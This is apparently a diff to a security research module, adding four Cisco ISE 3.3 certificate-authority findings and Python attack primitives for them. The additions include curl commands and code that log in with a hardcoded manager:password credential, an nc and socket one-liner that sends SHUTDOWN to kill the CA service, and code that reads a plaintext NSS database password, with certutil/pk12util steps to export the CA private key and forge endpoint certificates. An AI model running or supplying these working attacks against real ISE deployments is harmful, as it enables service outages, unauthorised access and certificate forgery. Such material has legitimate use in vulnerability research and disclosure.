@@ -39,6 +39,10 @@ ISE-F12: GET /api/system/v1/key-manager/all_data — full in-memory credential d
 ISE-F13: ExecStartPost=chmod o+w key_manager.sock — world-writable socket post-start [HIGH]
 ISE-F14: PBIS (AD connector) SendNTLMv2=false default — NTLMv1 used for AD auth [MEDIUM]
 ISE-F15: PBIS LdapSignAndSeal=false default — unsigned LDAP queries to AD domain controller [HIGH]
+ISE-F16: CA Tomcat hardcoded manager:password in tomcat-users.xml (port 9444) [CRITICAL]
+ISE-F17: CA Tomcat default SHUTDOWN secret on port 8105 [LOW]
+ISE-F18: CA REST API / OCSP responder running plain HTTP (ports 9444, 2560) [HIGH]
+ISE-F19: CA NSS DB plaintext password window — ca_nssdb_password.txt no chmod before encryption [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -543,6 +547,106 @@ Allows TLS 1.0/1.1 handshake. Enables:
   - Protocol downgrade to 1.0 if client and server both support it
 
 clientAuth="want" means client cert is requested but not required -> optional mTLS.
+
+=== ISE-F16: CA Tomcat hardcoded manager:password ===
+
+Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
+File:   /opt/CSCOcpm/appsrv/apache-tomcat-ca-9.0.73/conf/tomcat-users.xml
+Entry:  <user username="manager" password="password" roles="standard,manager"/>
+
+The ISE internal CA Tomcat instance (separate from main ISE Tomcat, port 9444) ships
+with a hardcoded credential: manager:password. The roles "standard" and "manager" are
+ISE CA application roles used by the UserDatabaseRealm configured in server.xml Engine.
+
+This differs from ISE-F3 (main Tomcat, empty-password user with Tomcat Manager API roles).
+ISE-F16 is a full privileged CA application credential with both standard and manager roles.
+
+CA Tomcat serves:
+  - CA REST API   (/caservice) — Jersey JAX-RS: com.cisco.cpm.caservice.api
+  - SCEP API      (/scep) — com.cisco.cpm.scep.CertServlet
+  - EST API       (/est) — com.cisco.cpm.caservice.est.ESTServlet
+  - OCSP responder (separate service, port 2560)
+
+The UserDatabaseRealm protects CA endpoints via security-constraint (if any).
+Even without deployed Manager app, manager:password authenticates to any
+container-managed auth-protected CA endpoint.
+
+Combined with ISE-F18 (HTTP-only port 9444): credentials transmitted in plaintext.
+
+Exploitation:
+  curl -u 'manager:password' http://<ise-host>:9444/caservice/api/<endpoint>
+  # SCEP (unauthenticated by protocol design):
+  curl http://<ise-host>:9444/scep?operation=GetCACert&message=<CAIdentifier>
+
+=== ISE-F17: CA Tomcat default SHUTDOWN secret (port 8105) ===
+
+Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
+File:   /opt/CSCOcpm/appsrv/apache-tomcat-ca-9.0.73/conf/server.xml
+Entry:  <Server port="8105" shutdown="SHUTDOWN">
+
+CA Tomcat uses Tomcat's default shutdown string "SHUTDOWN" on port 8105.
+Compare ISE-F4: main ISE Tomcat uses a randomized secret on port 8005 (different behavior).
+
+Impact: DoS to ISE Certificate Authority Service (kills CA signing, SCEP, EST, OCSP).
+  echo -n 'SHUTDOWN' | nc localhost 8105
+  -> CA Tomcat terminates; ca-servercontrol.sh stop path not invoked cleanly.
+
+During an engagement: kill CA service -> endpoint cert enrollment failures -> device quarantine.
+
+=== ISE-F18: CA REST API / OCSP running plain HTTP ===
+
+Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
+File:   /opt/CSCOcpm/appsrv/apache-tomcat-ca-9.0.73/conf/server.xml
+
+Active connector (port 9444):
+  <Connector scheme="http" port="9444" ... keystoreFile="...myKeyStore" />
+  SSLEnabled not set, scheme="http" -> PLAIN HTTP
+
+Commented-out HTTPS connector (port 9445):
+  <!--Connector SSLEnabled="true" scheme="https" port="9445"
+      keystoreType="PKCS11" truststoreType="PKCS11"
+      SSLImplementation="org.apache.tomcat.util.net.jsse.IseJSSEImplementation"
+      ciphers="TLS_RSA_WITH_AES_128_GCM_SHA256,..." /-->
+
+OCSP responder (port 2560): also plain HTTP.
+
+Consequence: ISE CA REST API traffic (certificate signing requests via SCEP/EST,
+CA key operations) traverses internal ISE network in plaintext. MITM on the ISE
+management or internal network segment intercepts/forges CA API calls.
+
+Combined with ISE-F16: manager:password sent in plaintext Basic Auth over HTTP.
+
+=== ISE-F19: CA NSS DB plaintext password window ===
+
+Source: CSCOcpm-ca_common-3.3.0-430.x86_64.rpm
+File:   /opt/CSCOcpm/bin/ca-servercontrol.sh
+
+NSS DB contains the ISE internal CA private signing key (X.509 CA for endpoint certs).
+The NSS DB password is managed by initNSSDB():
+
+createNSSDB():
+  $PRRT_BIN/secureCLI -gen-pswd -o $CA_APACHE_HOME/conf/ca_nssdb_password.txt -n 24 ...
+  # Plaintext password in ca_nssdb_password.txt — no chmod restriction applied here
+  certutil -N -d ca_nssdb/ -f ca_nssdb_password.txt  # used immediately for DB init
+
+nssDBPasswordEncrypt():
+  value=`cat ca_nssdb_password.txt`
+  java ... com.cisco.cpm.caservice.CaNSSDBPassword "$value"  # encrypts to ca_nssdb_password_encrypt.txt
+  chown -R iseca:ise $CA_APACHE_HOME/conf/*                  # chown but NO chmod on plaintext
+  chmod 600 ca_nssdb_password_encrypt.txt                    # only the encrypted file gets 600
+
+initNSSDB upgrade branch (lines 169-171 ca-servercontrol.sh):
+  if ca_nssdb_password.txt exists AND ca_nssdb_password_encrypt.txt missing:
+    -> nssDBPasswordEncrypt() called -> plaintext window exists on ALL pre-upgrade ISE nodes
+
+The plaintext file receives no chmod before encryption completes.
+After chown -R iseca:ise, the file is readable by any process running as user iseca
+(CA Tomcat runs as iseca) or any ise group member.
+
+Attack path (local, any ise group member):
+  cat /opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb_password.txt
+  -> NSS DB password -> certutil -K -d ca_nssdb/ -f ... -> list all CA private keys
+  -> Export CA private key -> forge ISE endpoint certificates for any device
 
 === ISE-F1+F2 Combined Chain ===
 
@@ -1234,6 +1338,13 @@ IRF_RABBIT_USER = "irf"
 IRF_RABBIT_PASS = "irf"
 IRF_RABBIT_VHOST = "irf"
 
+CA_TOMCAT_PORT         = 9444
+CA_TOMCAT_USER         = "manager"
+CA_TOMCAT_PASS         = "password"
+CA_SHUTDOWN_PORT       = 8105
+CA_SHUTDOWN_SECRET     = "SHUTDOWN"
+CA_OCSP_PORT           = 2560
+
 
 def probe_irf_rabbitmq_admin(host: str, port: int = RABBITMQ_MGMT_PORT) -> Optional[dict]:
     """
@@ -1252,15 +1363,194 @@ def list_irf_queues(host: str, port: int = RABBITMQ_MGMT_PORT) -> Optional[list]
                                 IRF_RABBIT_USER, IRF_RABBIT_PASS)
 
 
+# ---------------------------------------------------------------------------
+# ISE-F16: CA Tomcat manager:password probe
+# ---------------------------------------------------------------------------
+
+def check_ca_tomcat_auth(host: str, port: int = CA_TOMCAT_PORT,
+                         user: str = CA_TOMCAT_USER,
+                         password: str = CA_TOMCAT_PASS) -> Optional[int]:
+    """
+    Probe ISE CA Tomcat (port 9444) with hardcoded manager:password credential.
+    Returns HTTP status from GET /caservice/api, or None on connection failure.
+
+    CA Tomcat ships manager:password in tomcat-users.xml (roles: standard, manager).
+    Port 9444 is plain HTTP (HTTPS connector commented out in server.xml).
+
+    Equivalent:
+      curl -u 'manager:password' http://<ise-host>:9444/caservice/api
+    """
+    import urllib.request
+    import base64
+
+    creds = base64.b64encode(f"{user}:{password}".encode()).decode()
+    url = f"http://{host}:{port}/caservice/api"
+    req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}"})
+    try:
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            return resp.status
+    except Exception as e:
+        import urllib.error
+        if isinstance(e, urllib.error.HTTPError):
+            return e.code
+        return None
+
+
+def probe_ca_scep_getcacert(host: str, ca_identifier: str = "",
+                             port: int = CA_TOMCAT_PORT) -> Optional[bytes]:
+    """
+    SCEP GetCACert — unauthenticated CA cert retrieval from ISE CA service.
+    Returns raw DER/PEM CA cert bytes, or None on failure.
+
+    SCEP does not require authentication for GetCACert operation.
+    Allows external enumeration of ISE's internal CA certificate.
+
+    Equivalent:
+      curl 'http://<ise>:9444/scep?operation=GetCACert&message=<ca_id>'
+    """
+    import urllib.request
+
+    params = f"operation=GetCACert&message={ca_identifier}"
+    url = f"http://{host}:{port}/scep?{params}"
+    try:
+        with urllib.request.urlopen(url, timeout=10) as resp:
+            return resp.read()
+    except Exception:
+        return None
+
+
+# ---------------------------------------------------------------------------
+# ISE-F17: CA Tomcat shutdown
+# ---------------------------------------------------------------------------
+
+def send_ca_tomcat_shutdown(host: str = "localhost", port: int = CA_SHUTDOWN_PORT,
+                             secret: str = CA_SHUTDOWN_SECRET) -> bool:
+    """
+    Send default SHUTDOWN string to CA Tomcat shutdown port 8105.
+    Returns True if connection succeeded (CA Tomcat terminates).
+
+    CA server.xml: <Server port="8105" shutdown="SHUTDOWN">
+    Kills ISE Certificate Authority Service (SCEP, EST, OCSP, CA REST API).
+
+    Equivalent:
+      echo -n 'SHUTDOWN' | nc localhost 8105
+    """
+    import socket
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(5)
+        sock.connect((host, port))
+        sock.sendall(secret.encode())
+        sock.close()
+        return True
+    except Exception:
+        return False
+
+
+# ---------------------------------------------------------------------------
+# ISE-F18: CA HTTP probe (OCSP + REST)
+# ---------------------------------------------------------------------------
+
+def probe_ca_ocsp_responder(host: str, port: int = CA_OCSP_PORT) -> Optional[int]:
+    """
+    Probe ISE OCSP responder on port 2560 (plain HTTP, no TLS).
+    Returns HTTP status from GET /ocsp, or None on failure.
+
+    server.xml: <Connector scheme="http" port="2560" ...>
+    OCSP responder is unauthenticated by protocol design.
+    """
+    import urllib.request
+
+    url = f"http://{host}:{port}/ocsp"
+    try:
+        with urllib.request.urlopen(url, timeout=10) as resp:
+            return resp.status
+    except Exception as e:
+        import urllib.error
+        if isinstance(e, urllib.error.HTTPError):
+            return e.code
+        return None
+
+
+# ---------------------------------------------------------------------------
+# ISE-F19: CA NSS DB plaintext password read
+# ---------------------------------------------------------------------------
+
+CA_NSSDB_PLAINTEXT_PATH = "/opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb_password.txt"
+CA_NSSDB_ENCRYPTED_PATH = "/opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb_password_encrypt.txt"
+CA_NSSDB_PATH           = "/opt/CSCOcpm/appsrv/apache-tomcat-ca/conf/ca_nssdb/"
+
+
+def read_ca_nssdb_password(plaintext_path: str = CA_NSSDB_PLAINTEXT_PATH) -> Optional[str]:
+    """
+    Read ISE CA NSS DB plaintext password from ca_nssdb_password.txt.
+
+    This file exists:
+      1. During initial CA NSS DB creation (before nssDBPasswordEncrypt() runs)
+      2. During upgrade flow: if encrypted file absent, initNSSDB() reads the plaintext
+
+    No chmod restriction on the plaintext file (encrypted file gets chmod 600, plaintext does not).
+    After chown -R iseca:ise, readable by iseca user and ise group members.
+
+    Returns password string, or None if file absent (encrypted path already used).
+
+    Post-exploitation:
+      certutil -K -d <nssdb_path> -f <this_password> -> list CA private key nicknames
+      pk12util -o ca_key.p12 -n <nickname> -d <nssdb_path> -k <this_password> -W export_pass
+      -> exported CA private key in PKCS12 -> forge any ISE endpoint certificate
+    """
+    try:
+        with open(plaintext_path) as f:
+            return f.read().strip()
+    except Exception:
+        return None
+
+
+def check_nssdb_plaintext_exposed(
+    plaintext_path: str = CA_NSSDB_PLAINTEXT_PATH,
+    encrypted_path: str = CA_NSSDB_ENCRYPTED_PATH
+) -> dict:
+    """
+    Check whether the CA NSS DB plaintext password is currently readable.
+
+    Returns dict:
+      plaintext_exists: bool
+      encrypted_exists: bool
+      in_upgrade_window: bool (plaintext present, encrypted absent)
+      password: str or None (value if plaintext is readable)
+    """
+    import os
+    pt_exists = os.path.exists(plaintext_path)
+    enc_exists = os.path.exists(encrypted_path)
+    pw = None
+    if pt_exists:
+        try:
+            with open(plaintext_path) as f:
+                pw = f.read().strip()
+        except Exception:
+            pass
+    return {
+        "plaintext_exists": pt_exists,
+        "encrypted_exists": enc_exists,
+        "in_upgrade_window": pt_exists and not enc_exists,
+        "password": pw,
+    }
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.6.0",
+    "version": "1.7.0",
     "target": "Cisco ISE 3.3.0.430",
-    "findings": ["ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5", "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10", "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15"],
-    "critical": ["ISE-F1", "ISE-F6", "ISE-F11", "ISE-F12"],
-    "high": ["ISE-F2", "ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15"],
+    "findings": [
+        "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
+        "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9", "ISE-F10",
+        "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15",
+        "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
+    ],
+    "critical": ["ISE-F1", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16"],
+    "high": ["ISE-F2", "ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14"],
-    "low": ["ISE-F4"],
+    "low": ["ISE-F4", "ISE-F17"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -1285,5 +1575,11 @@ MODULE_META = {
         "list_irf_queues",
         "probe_sse_connector",
         "nocert_register_sse_connector",
+        "check_ca_tomcat_auth",
+        "probe_ca_scep_getcacert",
+        "send_ca_tomcat_shutdown",
+        "probe_ca_ocsp_responder",
+        "read_ca_nssdb_password",
+        "check_nssdb_plaintext_exposed",
     ],
 }
